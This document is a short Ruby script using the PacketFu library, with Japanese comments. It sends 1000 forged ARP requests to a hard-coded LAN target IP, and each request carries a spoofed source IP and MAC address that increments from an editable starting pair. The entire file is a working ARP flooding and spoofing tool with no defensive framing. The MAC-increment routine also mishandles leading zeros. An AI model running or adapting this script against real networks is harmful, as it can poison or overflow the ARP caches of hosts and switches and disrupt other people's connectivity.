#!/usr/bin/env ruby

require "packetfu"
require "ipaddr"

include PacketFu

def get_next_ip(ip_addr)
    i = IPAddr.new(ip_addr).to_i
    i = i + 1
    return IPAddr.new(i,2).to_string
end

def get_next_mac(mac_addr)
    m = mac_addr.split(":")

    #productIDを連結
    product = m[3] + m[4] + m[5]
    #productIDを整数にしインクリメント
    product = product.to_i(16) + 1
    #productIDを16進文字列に
    product = product.to_s(16)

    p = product.chars

    m[3] = p[0]+p[1]
    m[4] = p[2]+p[3]
    m[5] = p[4]+p[5]
    
    return m.join(":")
end

interface = "en0"
target_ip = "192.168.120.157"

# 以下２行をモディファイ
begin_ipaddr = "192.168.120.1"
begin_macaddr = "b8:e8:56:12:06:da"

arp_pkt = PacketFu::ARPPacket.new()

arp_pkt.eth_daddr = arp_pkt.arp_daddr_mac="ff:ff:ff:ff:ff:ff"   # dest hardware adress unknown.
arp_pkt.arp_daddr_ip = target_ip  # Target IP address

arp_pkt.arp_opcode=1  # Request

next_ip = curr_ip = begin_ipaddr;
next_mac = curr_mac = begin_macaddr;

for i in 1..1000

    next_ip = get_next_ip(curr_ip)
    next_mac = get_next_mac(curr_mac)

    arp_pkt.eth_saddr = arp_pkt.arp_saddr_mac = next_mac
    arp_pkt.arp_saddr_ip = next_ip
    
    arp_pkt.to_w(interface) 
    #arp_pkt.to_f('/tmp/arp.pcap')

    curr_ip = next_ip
    curr_mac = next_mac
end

